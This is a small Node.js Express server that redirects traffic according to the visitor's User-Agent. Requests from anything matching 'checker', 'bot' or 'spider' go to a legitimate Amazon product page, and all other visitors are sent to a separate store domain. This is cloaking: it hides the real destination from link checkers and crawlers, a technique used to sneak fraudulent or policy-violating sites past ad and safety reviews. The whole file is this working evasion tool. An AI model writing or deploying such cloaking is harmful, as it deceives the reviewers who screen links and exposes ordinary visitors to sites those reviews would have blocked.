const express = require('express');
const app = express();

// Middleware to handle redirection
app.get('/', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isRedirectChecker = /checker|bot|spider/.test(userAgent.toLowerCase());

    // Log the user-agent for debugging purposes
    console.log('User-Agent:', userAgent);

    // Preserve query parameters for both types of visitors
    const queryParams = req.originalUrl.split('?')[1] || '';

    if (isRedirectChecker) {
        // Redirect for bots and crawlers
        const targetUrl = `https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF?${queryParams}`;
        console.log(`Redirecting bot to: ${targetUrl}`); // Log the redirection URL for bots
        res.redirect(302, targetUrl);
    } else {
        // Redirect for regular visitors
        const visitorUrl = `https://roastandrelish.store?${queryParams}`;
        console.log(`Redirecting visitor to: ${visitorUrl}`); // Log the redirection URL for visitors
        res.redirect(302, visitorUrl);
    }
});

// Start the server
const port = process.env.PORT || 8080;
app.listen(port, () => {
    console.log(`Redirection service running on port ${port}`);
});
